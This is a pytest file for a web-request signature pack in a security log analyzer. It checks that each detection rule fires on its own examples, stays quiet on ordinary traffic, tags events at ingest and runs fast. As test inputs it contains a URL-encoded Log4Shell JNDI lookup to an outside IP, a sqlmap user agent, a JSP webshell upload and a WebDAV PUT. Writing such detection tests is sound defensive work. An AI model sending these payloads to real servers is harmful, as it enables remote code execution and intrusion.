"""Signature pack (detection content as data): every rule is replayed against its own examples, and the whole pack
against requests that must stay clean. A rule without an example cannot ship."""
from __future__ import annotations

import time

import pytest

from saw.analyzers.log.normalize import finalize
from saw.detectors import signatures as sg
from saw.devtools.sample_data import scenario_ndr_meta_csv, scenario_weblog
from saw.parsers.ndr import NdrMetaCsvParser
from saw.parsers.web import ApacheParser
from tests.unit.test_text_ingest import _events

PACK = sg.load_pack()


def event_for(s: sg.Signature, ex) -> dict:
    """An example as the event it stands for: a string goes into the field the rule looks at."""
    if isinstance(ex, dict):
        e = {"uri": ex.get("path", "") + (("?" + ex["query"]) if ex.get("query") else ""), "method": ex.get("method"),
             "user_agent": ex.get("ua")}
        if ex.get("upload"):
            e["ext"] = {"x": {"upload_filename": ex["upload"]}}
            e["uri"] = e["uri"] or "/upload.do"
        return e
    if s.where == "ua":
        return {"user_agent": ex, "uri": "/"}
    if s.where == "query":
        return {"uri": "/x.php?" + ex}
    if s.where == "referer":
        return {"uri": "/", "ext": {"x": {"referer": ex}}}
    if s.where == "any" and not ex.startswith("/"):
        return {"uri": "/", "user_agent": ex}
    return {"uri": ex}


def test_pack_is_large_and_well_formed():
    assert len(PACK) >= 150 and len({s.id for s in PACK}) == len(PACK)
    for s in PACK:
        assert s.title and s.explain and s.checks, s.id          # every finding can explain itself and say what to do
        assert s.examples, f"{s.id} has no example"
        assert 0 < s.severity <= 1 and s.confidence in ("low", "medium", "high") and s.attack, s.id
        assert s.stage in ("RECON", "DISCOVERY", "EXPLOITATION", "EXECUTION", "PERSISTENCE", "DATA_ACCESS", "OUTBOUND"), s.id


@pytest.mark.parametrize("s", PACK, ids=[s.id for s in PACK])
def test_rule_matches_its_examples_and_not_its_benign_cases(s):
    for ex in s.examples:
        assert s.id in sg.sig_ids(event_for(s, ex)), f"{s.id} should match {ex!r}"
    for ex in s.benign:
        assert s.id not in sg.sig_ids(event_for(s, ex)), f"{s.id} must not match {ex!r}"


BENIGN = [
    ("GET", "/", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"),
    ("GET", "/index.jsp", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148"),
    ("GET", "/main.do?menuId=1001&lang=ko", "Mozilla/5.0 (Linux; Android 14; SM-S921N) AppleWebKit/537.36 Mobile Safari/537.36"),
    ("POST", "/login.do", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"),
    ("POST", "/api/v1/accounts/transfer", "okhttp/4.12.0"),
    ("GET", "/api/v1/customers/123456?fields=name,phone&sort=id&order=desc", "Dalvik/2.1.0 (Linux; U; Android 14)"),
    ("GET", "/board/list.php?page=3&cmd=list&keyword=%EB%8C%80%EC%B6%9C+%EA%B8%88%EB%A6%AC", "Mozilla/5.0"),
    ("GET", "/board/view.jsp?no=8812&c=notice", "Mozilla/5.0"),
    ("GET", "/static/js/app.9f3c1b.js", "Mozilla/5.0"), ("GET", "/static/css/main.css?v=20261001", "Mozilla/5.0"),
    ("GET", "/images/logo.png", "Mozilla/5.0"), ("GET", "/upload/2026/10/receipt_123.jpg", "Mozilla/5.0"),
    ("GET", "/files/download.do?fileId=7731&name=%EA%B2%AC%EC%A0%81%EC%84%9C.pdf", "Mozilla/5.0"),
    ("GET", "/search?q=how+to+use+curl+and+wget", "Mozilla/5.0"), ("GET", "/search?q=select+a+plan&from=home", "Mozilla/5.0"),
    ("GET", "/product/list?price=%241000-%242000&discount=10%25", "Mozilla/5.0"),
    ("GET", "/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail.example.com%2fowa", "Mozilla/5.0"),
    ("GET", "/autodiscover/autodiscover.json?Email=kim@example.com&Protocol=ActiveSync", "Microsoft Office/16.0"),
    ("GET", "/favicon.ico", "Mozilla/5.0"), ("GET", "/robots.txt", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"),
    ("GET", "/sitemap.xml", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"),
    ("GET", "/health", "kube-probe/1.29"), ("GET", "/api/status", "Zabbix"),
    ("POST", "/common/ajax/getCode.do?grp=BANK&_=1759999999999", "Mozilla/5.0"),
    ("GET", "/event/2026/chuseok/index.html?utm_source=kakao&utm_medium=push", "KAKAOTALK 10.9.5"),
    ("GET", "/cert/issue.do?step=2&type=id", "Mozilla/5.0"), ("GET", "/mypage/info.do?tab=pwd", "Mozilla/5.0"),
    ("GET", "/download/app-release.apk", "Mozilla/5.0"), ("GET", "/docs/manual_v2.pdf", "Mozilla/5.0"),
    ("GET", "/api/items?filter=$top&$skip=20", "python-requests/2.32.3"), ("GET", "/console.html", "Mozilla/5.0"),
    ("GET", "/proxy/index.html", "Mozilla/5.0"), ("GET", "/admin/login.do", "Mozilla/5.0"),
]


def test_ordinary_requests_stay_clean():
    for method, uri, ua in BENIGN:
        assert sg.sig_ids({"method": method, "uri": uri, "user_agent": ua}) == [], (method, uri, ua)


def test_sample_traffic_normal_part_stays_clean_and_probe_part_is_recognised():
    """In the synthetic web log the ordinary requests (API, static files, login answered with 200) must not trip a
    single signature, while its built-in probing section is recognised."""
    web = list(_events(ApacheParser(), "\n".join(scenario_weblog(normal=600, enum_count=0)) + "\n"))
    found = {t for e in web for t in e.get("tags", []) if t.startswith("sig:")}
    assert {"sig:exposure.secrets_files", "sig:exposure.source_repo"} <= found
    clean = [e for e in web if e.get("status_code") == 200 and str(e.get("uri", "")).startswith(("/api/", "/static/", "/login"))]
    assert len(clean) > 300 and not any(t.startswith("sig:") for e in clean for t in e.get("tags", []))
    ndr = [e for e in _events(NdrMetaCsvParser(), scenario_ndr_meta_csv(normal=300)) if e["data_source"] == "web"]
    ordinary = [e for e in ndr if e.get("status_code") == 200 and not any(t.startswith("pattern:") for t in e.get("tags", []))
                and e.get("ua_class") == "mobile_app"]
    assert len(ordinary) > 100 and not any(t.startswith("sig:") for e in ordinary for t in e.get("tags", []))


def test_tags_are_added_at_ingest_for_every_web_like_source():
    ev = finalize({"event_id": "e", "investigation_id": "i", "data_source": "web", "timestamp_raw": "2026-10-05T01:02:03Z",
                   "method": "get", "uri": "/?x=%24%7Bjndi%3Aldap%3A%2F%2F198.51.100.7%2Fa%7D", "user_agent": "sqlmap/1.7"}, assumed_tz="UTC")
    assert {"sig:rce.log4shell", "sig:tool.sqlmap"} <= set(ev["tags"])
    up = finalize({"event_id": "e", "investigation_id": "i", "data_source": "web", "timestamp_raw": "2026-10-05T01:02:03Z",
                   "method": "POST", "uri": "/board/write.do", "ext": {"ndr": {"upload_filename": "photo.jsp"}}}, assumed_tz="UTC")
    assert "sig:webshell.upload_executable" in up["tags"]
    put = finalize({"event_id": "e", "investigation_id": "i", "data_source": "zeek_http", "timestamp_raw": "2026-10-05T01:02:03Z",
                    "method": "PUT", "uri": "/test.jsp"}, assumed_tz="UTC")
    assert "sig:inject.webdav_methods" in put["tags"]
    get = finalize({"event_id": "e", "investigation_id": "i", "data_source": "web", "timestamp_raw": "2026-10-05T01:02:03Z",
                    "method": "GET", "uri": "/test.jsp"}, assumed_tz="UTC")
    assert "tags" not in get or not any(t.startswith("sig:") for t in get["tags"])


def test_matching_is_cheap_enough_for_large_files():
    """Budget: well under 50 µs per ordinary request on a slow PC (the 600 MB NDR file has about 440,000 requests)."""
    reqs = [{"method": m, "uri": f"{u}{'&' if '?' in u else '?'}n={i}", "user_agent": ua} for i in range(400) for m, u, ua in BENIGN]
    t = time.perf_counter()
    for e in reqs:
        sg.sig_ids(e)
    per = (time.perf_counter() - t) / len(reqs)
    assert per < 200e-6, f"{per * 1e6:.0f} µs per request"
